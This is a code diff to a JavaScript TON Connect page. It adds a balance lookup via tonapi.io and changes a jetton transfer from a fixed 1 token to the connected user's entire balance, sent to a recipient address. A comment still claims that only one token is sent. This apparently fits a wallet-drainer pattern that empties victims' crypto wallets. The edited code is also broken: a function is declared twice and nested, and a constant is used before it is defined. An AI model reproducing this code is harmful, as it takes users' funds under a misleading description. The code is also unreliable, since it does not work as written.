@@ -45,6 +45,18 @@
       buttonRootId: "ton-connect"
     });
 
+
+async function getJettonBalance(userAddress, jettonMasterAddress) {
+    const response = await fetch(`https://tonapi.io/v2/accounts/${userAddress}/jettons`);
+    const data = await response.json();
+  
+    const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
+    return jetton ? jetton.balance : "0";
+}
+
+async function sendJettonTransaction(userWalletAddress, recipientAddress) {
+    const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);
+
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
 
     async function sendJettonTransaction(userWalletAddress, recipientAddress) {
@@ -57,7 +69,7 @@
         payload: {
           type: "jetton_transfer",
           query_id: 0,
-          amount: "1000000000", // Попытка отправить 1 токен
+          amount: balance, // Попытка отправить 1 токен
           destination: recipientAddress,
           response_destination: null,
           custom_payload: null,
